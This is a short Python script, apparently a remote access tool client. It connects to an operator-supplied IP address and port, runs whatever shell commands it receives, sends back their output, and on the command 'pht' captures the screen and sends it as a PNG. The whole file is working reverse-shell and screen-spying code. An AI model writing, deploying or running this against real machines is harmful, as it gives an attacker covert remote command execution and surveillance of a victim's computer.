import socket
import subprocess
import io
from PIL import Image
from PIL import ImageGrab

print("Enter IP Address:")
ip = input()
print("Enter Port Number:")
port = int(input())

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

print("Connecting...")
while True:
    try:
        s.connect((ip,port))
        print("Connected")
        break
    except ConnectionRefusedError:
        pass


while True:
    rcv = (s.recv(1024)).decode()
    if rcv == "pht":
        img = ImageGrab.grab()
        buf = io.BytesIO()

        img.save(buf, format='PNG')

        image_bytes = buf.getvalue()

        size = len(image_bytes)

        s.sendall(f"{size}\n".encode())

        s.sendall(image_bytes)
    if rcv == "exit":
        break
    cmd = subprocess.getoutput(rcv)
    s.send(cmd.encode())

s.close()